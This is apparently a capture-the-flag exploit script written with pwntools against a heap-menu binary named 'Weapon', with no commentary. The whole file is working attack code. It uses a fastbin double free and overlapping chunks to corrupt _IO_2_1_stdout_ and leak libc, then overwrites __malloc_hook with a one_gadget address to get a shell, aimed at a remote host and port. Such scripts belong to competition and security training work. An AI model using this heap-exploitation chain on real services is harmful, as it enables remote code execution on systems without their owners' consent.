from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./Weapon")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./Weapon")
else:
	p = remote("139.180.216.34","8888")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./Weapon")

def menu(choice):
	p.sendlineafter("choice >> ",str(choice))

def add(index,size,content,type_ = True):
	menu(1)
	p.sendlineafter("wlecome input your size of weapon: ",str(size))
	p.sendlineafter("input index: ",str(index))
	if type_:
		p.sendafter("input your name:\n",content)
	else:
		p.sendafter("input your name:",content)

def free(index):
	menu(2)
	p.sendlineafter("input idx :",str(index))

def edit(index,content):
	menu(3)
	p.sendlineafter("input idx: ",str(index))
	p.sendafter("new content:",content)

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xE96)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
payload = "a" * 0x50 + p64(0) + p64(0x71)
add(0,0x60,payload)
add(1,0x60,"b")
add(2,0x60,"c")
add(3,0x60,"d")
free(0)
free(2)
free(0)
add(0,0x60,"\x60")
add(3,0x60,"e")
add(4,0x60,"f")
add(5,0x60,"g")
#debugf()
free(1)
edit(5,p64(0) + p64(0x70 + 0x70 + 1))
free(1)
edit(1,"\xdd\x25")
edit(5,p64(0) + p64(0x71))
payload = "\x00" * 3 + p64(0) * 6 + p64(0xfbad1800) + p64(0) * 3 + "\x00"
add(6,0x60,"1")
add(7,0x60,payload)
debugf()
p.recv(0x50)
leak_addr = u64(p.recv(8))
log.success("leak_addr:" + hex(leak_addr))
libc.address = leak_addr - 0xa3 + 0x20 - libc.symbols["_IO_2_1_stdout_"]
log.success("libc_base:" + hex(libc.address))
free(3)
free(4)
free(3)
payload = p64(libc.symbols["__malloc_hook"] - 0x23)
add(0,0x60,payload,False)
add(0,0x60,payload,False)
add(0,0x60,payload,False)
one_gadget = libc.address + 0xf02a4
payload = "aaa" + p64(0) * 2 + p64(one_gadget)
add(0,0x60,payload,False)
free(0)
p.interactive()
